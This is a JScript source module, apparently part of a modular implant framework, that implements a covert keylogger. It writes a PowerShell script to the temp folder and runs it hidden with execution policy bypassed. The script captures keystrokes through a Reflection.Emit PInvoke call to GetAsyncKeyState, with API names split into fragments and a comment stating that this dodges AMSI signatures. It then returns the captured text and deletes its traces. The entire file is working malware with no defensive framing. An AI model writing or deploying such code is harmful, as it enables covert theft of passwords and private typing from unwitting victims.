// chunk: collectors/keylogger_staged
// depends: core/emit_buffer, core/run_cmd, core/file_ops
// provides: collect_keystrokes
// format: jscript
// note: uses Reflection.Emit PInvoke for GetAsyncKeyState — avoids Add-Type AMSI signature

function collect_keystrokes() {
    emit("\r\n=== KEYLOG STATUS ===\r\n");
    var outFile = _s.ExpandEnvironmentStrings("%TEMP%") + "\\kl_" + Math.floor(Math.random() * 99999) + ".log";
    var psFile = _s.ExpandEnvironmentStrings("%TEMP%") + "\\kl_" + Math.floor(Math.random() * 99999) + ".ps1";
    var ps = "$ErrorActionPreference='SilentlyContinue'\r\n";
    ps += "$an=New-Object Reflection.AssemblyName('D')\r\n";
    ps += "$ab=[AppDomain]::CurrentDomain.DefineDynamicAssembly($an,'Run')\r\n";
    ps += "$mb=$ab.DefineDynamicModule('M')\r\n";
    ps += "$tb=$mb.DefineType('T','Public')\r\n";
    ps += "$dl='us'+'er'+'32'\r\n";
    ps += "$fn='Get'+'Async'+'Key'+'State'\r\n";
    ps += "$pm=$tb.DefinePInvokeMethod($fn,$dl,'Public,Static','Standard',[int16],@([int]),'Winapi','Auto')\r\n";
    ps += "$pm.SetImplementationFlags($pm.GetMethodImplementationFlags() -bor 'PreserveSig')\r\n";
    ps += "$t=$tb.CreateType()\r\n";
    ps += "$map=@{8='[BS]';9='[TAB]';13=\"`n\";32=' ';46='[DEL]'}\r\n";
    ps += "$buf=''\r\n";
    ps += "$sw=[Diagnostics.Stopwatch]::StartNew()\r\n";
    ps += "while($sw.Elapsed.TotalSeconds -lt {{KEYLOG_DURATION}}){\r\n";
    ps += "  for($k=8;$k -le 190;$k++){\r\n";
    ps += "    if($k -ge 16 -and $k -le 18){continue}\r\n";
    ps += "    $r=$t::$fn($k)\r\n";
    ps += "    if($r -band 1){\r\n";
    ps += "      $sh=$t::$fn(16) -band 0x8000\r\n";
    ps += "      if($map.ContainsKey($k)){$buf+=$map[$k]}\r\n";
    ps += "      elseif($k -ge 65 -and $k -le 90){if($sh){$buf+=[char]$k}else{$buf+=[char]($k+32)}}\r\n";
    ps += "      elseif($k -ge 48 -and $k -le 57){$buf+=[char]$k}\r\n";
    ps += "      elseif($k -ge 96 -and $k -le 105){$buf+=[char]($k-48)}\r\n";
    ps += "    }\r\n";
    ps += "  }\r\n";
    ps += "  [Threading.Thread]::Sleep(50)\r\n";
    ps += "}\r\n";
    ps += "$buf|Out-File '" + outFile + "' -Encoding utf8\r\n";
    try {
        var f = _fso.CreateTextFile(psFile, true);
        f.Write(ps);
        f.Close();
    } catch(ex) { emit("  PS write error: " + ex.message + "\r\n"); return; }
    emit("Method: Reflection.Emit PInvoke\r\n");
    emit("Duration: {{KEYLOG_DURATION}}s\r\n");
    _s.Run("powershell -Ep Bypass -W Hidden -File \"" + psFile + "\"", 0, true);
    var keys = read_file(outFile, 65536);
    emit("Hook: " + (keys.length > 0 ? "ACTIVE" : "FAILED") + "\r\n");
    emit("Captured: " + keys.length + " chars\r\n");
    emit("\r\n=== CAPTURED KEYSTROKES ===\r\n");
    emit(keys + "\r\n");
    try { _fso.DeleteFile(psFile); } catch(ex) {}
    try { _fso.DeleteFile(outFile); } catch(ex) {}
}
